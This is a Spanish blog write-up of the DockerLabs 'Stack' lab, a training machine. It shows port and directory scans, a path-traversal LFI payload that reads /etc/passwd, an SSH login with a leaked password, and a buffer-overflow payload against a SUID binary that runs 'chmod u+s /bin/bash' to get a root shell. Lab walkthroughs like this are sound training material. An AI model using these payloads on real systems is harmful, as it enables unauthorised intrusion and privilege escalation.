---
title: DockerLabs - Stack
summary: "Write-up del laboratorio Stack de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_stack"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ nmap -sCV -p22,80 172.17.0.2                               
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 85:7f:49:c5:89:f6:ce:d2:b3:92:f1:40:de:e0:56:c4 (ECDSA)
|_  256 6d:ed:59:b8:d8:cc:50:54:9d:37:65:58:f5:3f:52:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Web en producci\xC3\xB3n
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## análisis

Comenzamos revisando el puerto 80 de la máquina, donde a primera vista no vemos nada destacable:

![Desktop View](/20260105190823.webp){: width="972" height="589" .shadow}

Pero al ir al código fuente de la página, encontramos un comentario bastante interesante, el cual indica la ubicación de un fichero que contiene una contraseña:

![Desktop View](/20260105190945.webp){: width="972" height="589" .shadow}

Sin embargo, debido a que no tenemos todavía acceso a la máquina, no podemos verlo, así que seguimos revisando.

Dejaremos corriendo en segundo plano un escaneo de recursos del servidor con **gobuster**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 417]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/note.txt             (Status: 200) [Size: 110]
/file.php             (Status: 200) [Size: 0]
```

## acceso inicial (bob)

Uno de los recursos que encontramos es una nota, la cual indica que existe una vulnerabilidad **LFI** (Local File Inclusion) en un fichero PHP:

![Desktop View](/20260105191402.webp){: width="972" height="589" .shadow}

Dado que el otro fichero que hemos encontrado es `/file.php`, probamos a ver si encontramos cual es el parámetro que acepta este script con el cual tal vez podemos explotar el LFI:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ wfuzz -c --hh=0 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/file.php?FUZZ=....//....//....//....//....//etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz´s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/file.php?FUZZ=....//....//....//....//....//etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================

000002206:   200        20 L     22 W       922 Ch      "file"
```

Viendo que es posible explotar un LFI usando el script `file.php`, procedemos a leer el contenido del fichero que antes nos indicaban en un comentario en la pantalla inicial:

![Desktop View](/20260105194415.webp){: width="972" height="589" .shadow}

Probamos a conectarnos como el usuario `bob` con la contraseña que hemos encontrado, y vemos que accedemos correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ ssh bob@172.17.0.2
bob@172.17.0.2`s password: 
Linux 7d6ac627e4c6 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
bob@7d6ac627e4c6:~$ whoami
bob
bob@7d6ac627e4c6:~$ hostname
7d6ac627e4c6
```

Listamos los usuarios del sistema que tengan asignada una consola:

```bash
bob@7d6ac627e4c6:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000::/home/bob:/bin/bash
```

## escalada de privilegios (root)

En la carpeta `/opt` encontramos un binario cuyos permisos son **SUID** (Permite ejecutar el binario con los permisos del propietario, que en este caso es `root`)

```bash
bob@7d6ac627e4c6:/home$ ls -la /opt
total 24
drwxr-xr-x 1 root root  4096 Dec 19  2024 .
drwxr-xr-x 1 root root  4096 XXX  X 21:16 ..
-rwsr-xr-x 1 root root 16328 Dec 19  2024 command_exec
```

Al ejecutarlo, vemos que nos pide una contraseña para continuar:

```bash
bob@7d6ac627e4c6:/home$ /opt/command_exec   
Escribe la contraseña: 
Estás en modo usuario (key = 1234)
key debe valer 0xdead para entrar al modo administrador
```

Si intentamos indicar un gran número de caracteres, vemos que llegamos a corromper el programa:

```bash
bob@7d6ac627e4c6:/home$ /opt/command_exec
Escribe la contraseña: <5000 A`s>
Segmentation fault
```

Confirmamos en este punto que estamos tratando con una vulnerabilidad **Buffer Overflow** (vulnerabilidad que permite sobrescribir registros internos de los programas, permitiendo modificar su comportamiento).

Ahora indicaremos una cadena de caracteres un poco más corta, y vemos que ahora seguimos corrompiendo el programa, pero en el valor del parámetro `key` nos indica `4141414`, lo que significa que estamos sobrescribiendo el valor de dicha variable, ya que en hexadecimal eso es igual a `AAAA`, o el valor del **registro EIP**:

```bash
bob@7d6ac627e4c6:/home$ /opt/command_exec      
Escribe la contraseña: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Estás en modo usuario (key = 41414141)
key debe valer 0xdead para entrar al modo administrador
Segmentation fault
```

Para poder averiguar cual es el **junk** (cadena inicial que debemos indicar hasta antes de sobrescribir el EIP), usaremos un patrón generado por un script de **Metasploit** llamado **pattern_create.rb**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Volvemos a ejecutar el binario, e indicamos la cadena que nos ha devuelto el script:

```bash
bob@7d6ac627e4c6:/home$ /opt/command_exec
Escribe la contraseña: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Estás en modo usuario (key = 63413563)
key debe valer 0xdead para entrar al modo administrador
Segmentation fault
```

Teniendo ya el valor que está guardándose en el EIP, le pasaremos este valor al script **pattern_offset.rb**, que nos indicará cual es el **offset** o **junk** que debemos indicar en nuestro payload para cambiar el valor del parámetro `key`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```

Ahora sabemos que debemos indicar 76 caracteres antes de indicar `0xdead`, por lo que creamos un comando en Python que nos devuelva el payload completo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stack]
└─$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76+b"\xad\xde\x00\x00")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
```

Dado que lo que nos devuelve el comando que ejecutamos con Python no se interpreta correctamente, lo podemos pasar directamente al binario sin tener que imprimirlo por pantalla de la siguiente manera:

```bash
bob@7d6ac627e4c6:/home$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xad\xde\x00\x00\n" + b"whoami")' | /opt/command_exec
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando: root
```

Ya que hemos conseguido ejecución de comandos como el usuario `root`, podemos obtener una consola de diferentes maneras, pero en este caso optaremos por cambiar los permisos del binario `/bin/bash` a SUID, el cual de primeras vemos que no lo tiene asignado:

```bash
bob@7d6ac627e4c6:/home$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Ejecutamos el comando que modifica los permisos del binario `/bin/bash`:

```bash
bob@7d6ac627e4c6:/home$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xad\xde\x00\x00\n" + b"chmod u+s /bin/bash")' | /opt/command_exec
Escribe la contraseña: Estás en modo administrador (key = dead)
```

Si volvemos a revisar sus permisos, veremos que se han modificado correctamente:

```bash
bob@7d6ac627e4c6:/home$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Por lo que ahora podemos invocar una consola privilegiada:

```bash
bob@7d6ac627e4c6:/home$ bash -p
bash-5.2# whoami
root
```

Y así, habremos completado la máquina `Stack`!



<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>